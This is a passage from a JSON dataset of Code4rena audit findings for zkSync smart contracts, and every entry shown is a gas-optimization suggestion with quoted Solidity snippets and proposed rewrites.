onlyStateTransitionManager {\n[...]\n51:     function setPorterAvailability(bool _zkPorterIsAvailable) external onlyStateTransitionManager {\n[...]\n58:     function setPriorityTxMaxGasLimit(uint256 _newPriorityTxMaxGasLimit) external onlyStateTransitionManager { \n```\n\n[File: code/system-contracts/contracts/SystemContext.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L84)\n```solidity\n84:     function setChainId(uint256 _newChainId) external onlyCallFromForceDeployer {\n```\n\n[File: code/system-contracts/contracts/SystemContext.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L099)\n```solidity\n099:     function setTxOrigin(address _newOrigin) external onlyCallFromBootloader {\n[...]\n105:     function setGasPrice(uint256 _gasPrice) external onlyCallFromBootloader {\n[...]\n112:     function setPubdataInfo(uint256 _gasPerPubdataByte, uint256 _basePubdataSpent) external onlyCallFromBootloader {\n```\n\n[File: code/contracts/ethereum/contracts/governance/Governance.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/governance/Governance.sol#L249)\n```solidity\n249:     function updateDelay(uint256 _newDelay) external onlySelf {\n[...]\n256:     function updateSecurityCouncil(address _newSecurityCouncil) external onlySelf {\n```\n\n[File: code/system-contracts/contracts/ContractDeployer.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/ContractDeployer.sol#L65)\n```solidity\n65:     function updateAccountVersion(AccountAbstractionVersion _version) external onlySystemCall {\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L67)\n```solidity\n67:     function changeFeeParams(FeeParams calldata _newFeeParams) external onlyAdminOrStateTransitionManager {\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33291",
      "title": "[G-46] Use `msg.value` directly, instead of assigning it to variable",
      "impact": "GAS",
      "content": "\n**File:** `ContractDeployer.sol`\n\n[File: code/system-contracts/contracts/ContractDeployer.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/ContractDeployer.sol#L329)\n```solidity\n329:         uint256 value = msg.value;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33290",
      "title": "[G-45]  Do not declare local variables used only once",
      "impact": "GAS",
      "content": "\n<details>\n\n**Files:** `L2ContractHelper.sol`, `Compressor.sol`, `L2SharedBridge.sol`, `Mailbox.sol`, `L1ERC20Bridge.sol`, `NonceHolder.sol`, `DefaultAccount.sol`, `EfficientCall.sol`, `AccountCodeStorage.sol`, `L1SharedBridge.sol`, `Diamond.sol`, `L2StandardERC20.sol`, `SystemContractHelper.sol`, `KnownCodesStorage.sol`, `Admin.sol`, `ContractDeployer.sol`\n\n[File: code/contracts/zksync/contracts/bridge/L2StandardERC20.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/zksync/contracts/bridge/L2StandardERC20.sol#L119)\n```solidity\n119:         address beaconAddress = _getBeacon();\n120:         require(msg.sender == UpgradeableBeacon(beaconAddress).owner(), \"tt\");\n```\n\nVariable `beaconAddress` is used only once, thus this variable is redundant. Above code can be rewritten to:\n\n```\nrequire(msg.sender == UpgradeableBeacon(_getBeacon()).owner(), \"tt\");\n```\n\n[File: code/contracts/zksync/contracts/bridge/L2SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/zksync/contracts/bridge/L2SharedBridge.sol#L64)\n```solidity\n64:             address l2StandardToken = address(new L2StandardERC20{salt: bytes32(0)}());\n65:             l2TokenBeacon = new UpgradeableBeacon{salt: bytes32(0)}(l2StandardToken);\n```\n\nVariable `l2StandardToken` is used only once, thus it is redundant. Above code can be changed to:\n\n```\nl2TokenBeacon = new UpgradeableBeacon{salt: bytes32(0)}(address(new L2StandardERC20{salt: bytes32(0)}()));\n```\n\n[File: code/contracts/zksync/contracts/bridge/L2SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/zksync/contracts/bridge/L2SharedBridge.sol#L110)\n```solidity\n110:         bytes32 salt = _getCreate2Salt(_l1Token);\n111: \n112:         BeaconProxy l2Token = _deployBeaconProxy(salt);\n```\n\nVariable `salt` is used only once, thus it is redundant. Above code can be changed to:\n\n```\nBeaconProxy l2Token = _deployBeaconProxy(_getCreate2Salt(_l1Token));\n```\n\n[File: code/contracts/zksync/contracts/bridge/L2SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/zksync/contracts/bridge/L2SharedBridge.sol#L150)\n```solidity\n150:         bytes32 constructorInputHash = keccak256(abi.encode(address(l2TokenBeacon), \"\"));\n151:         bytes32 salt = _getCreate2Salt(_l1Token);\n152:         return\n153:             L2ContractHelper.computeCreate2Address(address(this), salt, l2TokenProxyBytecodeHash, constructorInputHash);\n```\n\nVariables `constructorInputHash` and `salt` are used only once, thus they are redundant. Above code can be changed to:\n\n```\nreturn\n    L2ContractHelper.computeCreate2Address(address(this), _getCreate2Salt(_l1Token), l2TokenProxyBytecodeHash, keccak256(abi.encode(address(l2TokenBeacon), \"\")));\n```\n\n[File: code/system-contracts/contracts/libraries/EfficientCall.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/libraries/EfficientCall.sol#L261)\n```solidity\n261:         uint32 shrinkTo = uint32(msg.data.length - (_data.length + dataOffset));\n262:         SystemContractHelper.ptrShrinkIntoActive(shrinkTo);\n263: \n264:         uint32 gas = Utils.safeCastToU32(_gas);\n265:         uint256 farCallAbi = SystemContractsCaller.getFarCallABIWithEmptyFatPointer(\n266:             gas,\n```\n\n`shrinkTo` and `gas` are used only once, thus there's no need to declare them at all:\n\n```\n        SystemContractHelper.ptrShrinkIntoActive(uint32(msg.data.length - (_data.length + dataOffset)));\n\n        uint256 farCallAbi = SystemContractsCaller.getFarCallABIWithEmptyFatPointer(\n            Utils.safeCastToU32(_gas),\n```\n\n[File: code/system-contracts/contracts/libraries/SystemContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L217)\n```solidity\n217:         uint256 shifted = (meta << (256 - size - offset));\n218:         // Then we shift everything back\n219:         result = (shifted >> (256 - size));\n```\n\n`shifted` is used only once, thus there's no need to declare this variable at all:\n\n```\nresult = ((meta << (256 - size - offset)) >> (256 - size));\n```\n\n[File: code/system-contracts/contracts/NonceHolder.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/NonceHolder.sol#L92)\n```solidity\n92:         uint256 addressAsKey = uint256(uint160(msg.sender));\n93: \n94:         nonceValues[addressAsKey][_key] = _value;\n```\n\n`addressAsKey` is used only once, thus there's no need to declare this variable at all:\n\n```\n nonceValues[uint256(uint160(msg.sender))][_key] = _value;\n```\n\n[File: code/system-contracts/contracts/NonceHolder.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/NonceHolder.sol#L103)\n```solidity\n103:         uint256 addressAsKey = uint256(uint160(msg.sender));\n104:         return nonceValues[addressAsKey][_key];\n```\n\n`addressAsKey` is used only once, thus there's no need to declare this variable at all:\n\n```\n return nonceValues[uint256(uint160(msg.sender))][_key];\n```\n\n[File: code/system-contracts/contracts/KnownCodesStorage.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/KnownCodesStorage.sol#L75)\n```solidity\n75:         uint8 version = uint8(_bytecodeHash[0]);\n76:         require(version == 1 && _bytecodeHash[1] == bytes1(0), \"Incorrectly formatted bytecodeHash\");\n```\n\n`version` is used only once, thus there's no need to declare this variable at all:\n\n```\nrequire(uint8(_bytecodeHash[0]) == 1 && _bytecodeHash[1] == bytes1(0), \"Incorrectly formatted bytecodeHash\");\n```\n\n[File: code/system-contracts/contracts/DefaultAccount.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/DefaultAccount.sol#L099)\n```solidity\n099:         uint256 totalRequiredBalance = _transaction.totalRequiredBalance();\n100:         require(totalRequiredBalance <= address(this).balance, \"Not enough balance for fee + value\");\n```\n\n`totalRequiredBalance` is used only once, thus there's no need to declare this variable at all:\n\n```\nrequire(_transaction.totalRequiredBalance() <= address(this).balance, \"Not enough balance for fee + value\");\n```\n\n[File: code/system-contracts/contracts/ContractDeployer.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/ContractDeployer.sol#L121)\n```solidity\n121:         bytes32 hash = keccak256(\n122:             bytes.concat(CREATE_PREFIX, bytes32(uint256(uint160(_sender))), bytes32(_senderNonce))\n123:         );\n124: \n125:         newAddress = address(uint160(uint256(hash)));\n```\n\n`hash` is used only once, thus there's no need to declare this variable at all:\n\n```\nnewAddress = address(uint160(uint256(keccak256(bytes.concat(CREATE_PREFIX, bytes32(uint256(uint160(_sender))), bytes32(_senderNonce))))));\n```\n\n[File: code/system-contracts/contracts/ContractDeployer.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/ContractDeployer.sol#L302)\n```solidity\n302:         uint256 knownCodeMarker = KNOWN_CODE_STORAGE_CONTRACT.getMarker(_bytecodeHash);\n303:         require(knownCodeMarker > 0, \"The code hash is not known\");\n```\n\n`knownCodeMarker` is used only once, thus there's no need to declare this variable at all:\n\n```\nrequire(KNOWN_CODE_STORAGE_CONTRACT.getMarker(_bytecodeHash) > 0, \"The code hash is not known\");\n```\n\n[File: code/system-contracts/contracts/Compressor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/Compressor.sol#L65)\n```solidity\n65:                 uint64 encodedChunk = dictionary.readUint64(indexOfEncodedChunk);\n66:                 uint64 realChunk = _bytecode.readUint64(encodedDataPointer * 4);\n67: \n68:                 require(encodedChunk == realChunk, \"Encoded chunk does not match the original bytecode\");\n```\n\n`encodedChunk` and `realChunk` are used only once, thus there's no need to declare those variables at all:\n\n```\nrequire(dictionary.readUint64(indexOfEncodedChunk) == _bytecode.readUint64(encodedDataPointer * 4), \"Encoded chunk does not match the original bytecode\");\n```\n\n[File: code/system-contracts/contracts/AccountCodeStorage.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/AccountCodeStorage.sol#L60)\n```solidity\n60:         bytes32 constructedBytecodeHash = Utils.constructedBytecodeHash(codeHash);\n61: \n62:         _storeCodeHash(_address, constructedBytecodeHash);\n```\n\n`constructedBytecodeHash` is used only once, thus there's no need to declare this variable at all:\n\n```\n_storeCodeHash(_address, Utils.constructedBytecodeHash(codeHash));\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/Diamond.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/Diamond.sol#L192)\n```solidity\n192:         uint256 selectorsLength = ds.facetToSelectors[_facet].selectors.length;\n193:         // If there are no selectors associated with facet then save facet as new one\n194:         if (selectorsLength == 0) {\n```\n\n`selectorsLength` is used only once, thus there's no need to declare this variable at all:\n\n```\nif (ds.facetToSelectors[_facet].selectors.length == 0) {\n```\n\n[File: code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L40)\n```solidity\n40:         uint8 version = uint8(_bytecodeHash[0]);\n41:         require(version == 1 && _bytecodeHash[1] == bytes1(0), \"zf\"); // Incorrectly formatted bytecodeHash\n```\n\n`version` is used once, thus there's no need to declare this variable at all:\n\n```\nrequire(uint8(_bytecodeHash[0]) == 1 && _bytecodeHash[1] == bytes1(0), \"zf\"); // Incorrectly formatted bytecodeHash\n```\n\n[File: code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L66)\n```solidity\n66:         bytes32 senderBytes = bytes32(uint256(uint160(_sender)));\n67:         bytes32 data = keccak256(\n68:             bytes.concat(CREATE2_PREFIX, senderBytes, _salt, _bytecodeHash, _constructorInputHash)\n69:         );\n70: \n71:         return address(uint160(uint256(data)));\n```\n\n`senderBytes` and `data` are used once, thus there's no need to declare those variables:\n\n```\nreturn address(uint160(uint256( keccak256(\n            bytes.concat(CREATE2_PREFIX, bytes32(uint256(uint160(_sender))), _salt, _bytecodeHash, _constructorInputHash)\n        ))));\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L104)\n```solidity\n104:         bytes32 cutHashInput = keccak256(abi.encode(_diamondCut));\n105:         require(\n106:             cutHashInput == IStateTransitionManager(s.stateTransitionManager).upgradeCutHash(_oldProtocolVersion),\n107:             \"StateTransition: cutHash mismatch\"\n108:         );\n109: \n```\n\n`cutHashInput` is used only once, thus there's no need to declare this variable at all:\n\n```\n        require(\n            keccak256(abi.encode(_diamondCut)) == IStateTransitionManager(s.stateTransitionManager).upgradeCutHash(_oldProtocolVersion),\n            \"StateTransition: cutHash mismatch\"\n        );\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L41)\n```solidity\n41:         uint256 amount = address(this).balance;\n42:         address sharedBridgeAddress = s.baseTokenBridge;\n43:         IL1SharedBridge(sharedBridgeAddress).receiveEth{value: amount}(ERA_CHAIN_ID);\n```\n\n`amount` and `sharedBridgeAddress` are used only once, thus there's no need to declare those variables at all:\n\n```\nIL1SharedBridge(s.baseTokenBridge).receiveEth{value: address(this).balance}(ERA_CHAIN_ID);\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L123)\n```solidity\n123:         bytes32 calculatedRootHash = Merkle.calculateRoot(_proof, _index, hashedLog);\n124:         bytes32 actualRootHash = s.l2LogsRootHashes[_batchNumber];\n125: \n126:         return actualRootHash == calculatedRootHash;\n```\n\n`calculatedRootHash` and `actualRootHash` are used only once, thus there's no need to declare those variables at all:\n\n```\nreturn Merkle.calculateRoot(_proof, _index, hashedLog) == s.l2LogsRootHashes[_batchNumber];\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L148)\n```solidity\n148:         uint256 l2GasPrice = _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit);\n149:         return l2GasPrice * _l2GasLimit;\n```\n\n`l2GasPrice` is used only once, thus there's no need to declare this variable at all:\n\n```\nreturn _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit) * _l2GasLimit;;\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L271)\n```solidity\n271:         uint256 baseCost = _params.l2GasPrice * _params.l2GasLimit;\n272:         require(_mintValue >= baseCost + _params.l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n```\n\n`baseCost` is used only once, thus there's no need to declare this variable at all:\n\n```\nrequire(_mintValue >= _params.l2GasPrice * _params.l2GasLimit + _params.l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n```\n\n[File: code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L160)\n```solidity\n160:             uint256 amount = _depositFunds(_prevMsgSender, IERC20(_l1Token), _amount); // note if _prevMsgSender is this contract, this will return 0. This does not happen.\n161:             require(amount == _amount, \"3T\"); // The token has non-standard transfer logic\n```\n\n`amount` is used only once, thus there's no need to declare this variable at all:\n\n```\nrequire(_depositFunds(_prevMsgSender, IERC20(_l1Token), _amount) == _amount, \"3T\"); // The token has non-standard transfer logic\n```\n\n[File: code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L205)\n```solidity\n205:             uint256 withdrawAmount = _depositFunds(_prevMsgSender, IERC20(_l1Token), _depositAmount);\n206:             require(withdrawAmount == _depositAmount, \"5T\"); // The token has non-standard transfer logic\n```\n\n`withdrawAmount` is used only once, thus there's no need to declare this variable at all:\n\n```\n require(_depositFunds(_prevMsgSender, IERC20(_l1Token), _depositAmount) == _depositAmount, \"5T\"); // The token has non-standard transfer logic\n```\n\n[File: code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L340)\n```solidity\n340:                 bytes32 dataHash = depositHappened[_chainId][_l2TxHash];\n341:                 bytes32 txDataHash = keccak256(abi.encode(_depositSender, _l1Token, _amount));\n342:                 require(dataHash == txDataHash, \"ShB: d.it not hap\");\n```\n\n`dataHash` and `txDataHash` are used only once, thus there's no need to declare those variables at all:\n\n```\nrequire(depositHappened[_chainId][_l2TxHash] == keccak256(abi.encode(_depositSender, _l1Token, _amount)), \"ShB: d.it not hap\");\n```\n\n[File: code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L76)\n```solidity\n76:         bytes32 constructorInputHash = keccak256(abi.encode(l2TokenBeacon, \"\"));\n77:         bytes32 salt = bytes32(uint256(uint160(_l1Token)));\n78: \n79:         return L2ContractHelper.computeCreate2Address(l2Bridge, salt, l2TokenProxyBytecodeHash, constructorInputHash);\n```\n\n`constructorInputHash` and `salt` are used only once, thus there's no need to declare those variables at all:\n\n```\nreturn L2ContractHelper.computeCreate2Address(l2Bridge,  bytes32(uint256(uint160(_l1Token))), l2TokenProxyBytecodeHash, keccak256(abi.encode(l2TokenBeacon, \"\")));\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33289",
      "title": "[G-44] Do not emit events with empty data",
      "impact": "GAS",
      "content": "\n**File:** `Admin.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L139)\n```solidity\n139:         emit Freeze();\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L149)\n```solidity\n149:         emit Unfreeze();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33288",
      "title": "[G-43] `public` functions which are not called by the contract should be declared as `external`",
      "impact": "GAS",
      "content": "\n**File:** `Mailbox.sol`\n\nWhen `public` function is never called internally and is only expected to be invoked externally, it is more gas-efficient to explicitly declare it as `external`.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L74)\n```solidity\n74:     function proveL1ToL2TransactionStatus(\n75:         bytes32 _l2TxHash,\n76:         uint256 _l2BatchNumber,\n77:         uint256 _l2MessageIndex,\n78:         uint16 _l2TxNumberInBatch,\n79:         bytes32[] calldata _merkleProof,\n80:         TxStatus _status\n81:     ) public view returns (bool) {\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L143)\n```solidity\n143:     function l2TransactionBaseCost(\n144:         uint256 _gasPrice,\n145:         uint256 _l2GasLimit,\n146:         uint256 _l2GasPerPubdataByteLimit\n147:     ) public view returns (uint256) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33287",
      "title": "[G-42] Use `\"\"` instead of `new bytes(0)`",
      "impact": "GAS",
      "content": "\n**Files:** `StateTransitionManager.sol`, `Mailbox.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L308)\n```solidity\n308:             signature: new bytes(0),\n309:             factoryDeps: _hashFactoryDeps(_factoryDeps),\n310:             paymasterInput: new bytes(0),\n311:             reservedDynamic: new bytes(0)\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L196)\n```solidity\n196:             signature: new bytes(0),\n197:             factoryDeps: uintEmptyArray,\n198:             paymasterInput: new bytes(0),\n199:             reservedDynamic: new bytes(0)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33286",
      "title": "[G-41] Inline `modifier`s that are only used once, to save gas",
      "impact": "GAS",
      "content": "\n**Files:** `ContractDeployer.sol`, `KnownCodesStorage.sol`\n\n[File: code/system-contracts/contracts/ContractDeployer.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/ContractDeployer.sol#L213)\n```solidity\n213:     function forceDeployOnAddress(ForceDeployment calldata _deployment, address _sender) external payable onlySelf {\n```\n\n[File: code/system-contracts/contracts/KnownCodesStorage.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/KnownCodesStorage.sol#L39)\n```solidity\n39:     function markBytecodeAsPublished(bytes32 _bytecodeHash) external onlyCompressor {\n```\n\nModifiers `onlySelf` and `onlyCompressor` where used only once, thus they can be inlined.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33285",
      "title": "[G-40] else-block is not required in `getOperationState()`",
      "impact": "GAS",
      "content": "\n**File:** `Governance.sol`\n\n[File: code/contracts/ethereum/contracts/governance/Governance.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/governance/Governance.sol#L105)\n```solidity\n105:     function getOperationState(bytes32 _id) public view returns (OperationState) {\n106:         uint256 timestamp = timestamps[_id];\n107:         if (timestamp == 0) {\n108:             return OperationState.Unset;\n109:         } else if (timestamp == EXECUTED_PROPOSAL_TIMESTAMP) {\n110:             return OperationState.Done;\n111:         } else if (timestamp > block.timestamp) {\n112:             return OperationState.Waiting;\n113:         } else {\n114:             return OperationState.Ready;\n115:         }\n116:     }\n```\n\nThe `else` instruction at line 113 can be removed. When previous conditions won't be fulfilled, function will still return `OperationState.Ready`. Getting rid of redundant `else` instruction saves additional gas.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33284",
      "title": "[G-39] Use AND operators instead of modulo (%) to check if number is odd/even",
      "impact": "GAS",
      "content": "\n**Files:** `L2ContractHelper.sol`, `Utils.sol`, `Merkle.sol`, `KnownCodesStorage.sol`\n\n[File: code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L43)\n```solidity\n43:         require(bytecodeLen(_bytecodeHash) % 2 == 1, \"uy\"); // Code length in words must be odd\n```\n\n[File: code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L27)\n```solidity\n27:         require(bytecodeLenInWords % 2 == 1, \"ps\"); // bytecode length in words must be odd\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/Merkle.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/Merkle.sol#L30)\n```solidity\n30:             currentHash = (_index % 2 == 0)\n```\n\n[File: code/system-contracts/contracts/KnownCodesStorage.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/KnownCodesStorage.sol#L78)\n```solidity\n78:         require(Utils.bytecodeLenInWords(_bytecodeHash) % 2 == 1, \"Code length in words must be odd\");\n```\n\n[File: code/system-contracts/contracts/libraries/Utils.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/libraries/Utils.sol#L88)\n```solidity\n88:         require(lengthInWords % 2 == 1, \"pr\"); // bytecode length in words must be odd\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33283",
      "title": "[G-38] Dot notation for struct assignment costs less gas",
      "impact": "GAS",
      "content": "\n**File:** `Diamond.sol`\n\nUsing named arguments for struct means that the compiler needs to organize the fields in memory before doing the assignment, which wastes gas. Set each field directly in storage (use dot-notation), or use the unnamed version of the constructor.\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/Diamond.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/Diamond.sol#L218)\n```solidity\n218:         ds.selectorToFacet[_selector] = SelectorToFacet({\n219:             facetAddress: _facet,\n220:             selectorPosition: selectorPosition,\n221:             isFreezable: _isSelectorFreezable\n222:         });\n```\n\nshould be optimized to:\n\n```\nds.selectorToFacet[_selector].facetAddress = _facet;\nds.selectorToFacet[_selector].selectorPosition = selectorPosition;\nds.selectorToFacet[_selector].isFreezable = _isSelectorFreezable;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33282",
      "title": "[G-37] Code related to local testing should be removed",
      "impact": "GAS",
      "content": "\n**Files:** `StateTransitionManager.sol`, `DiamondInit.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/DiamondInit.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/DiamondInit.sol#L49)\n```solidity\n49:         // While this does not provide a protection in the production, it is needed for local testing\n50:         // Length of the L2Log encoding should not be equal to the length of other L2Logs' tree nodes preimages\n51:         assert(L2_TO_L1_LOG_SERIALIZE_SIZE != 2 * 32); \n```\n\n[File: code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L104)\n```solidity\n104:         // While this does not provide a protection in the production, it is needed for local testing\n105:         // Length of the L2Log encoding should not be equal to the length of other L2Logs' tree nodes preimages\n106:         assert(L2_TO_L1_LOG_SERIALIZE_SIZE != 2 * 32); \n```\n\nAbove `assert()` is just a waste of gas in the production environment. Moreover it increases the size of the contract, thus increases the deployment cost. Our recommendation is to get rid of code related to local testing only.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33281",
      "title": "[G-36] Use bitwise operators instead of multiplication/division by value of 2 to the power of N",
      "impact": "GAS",
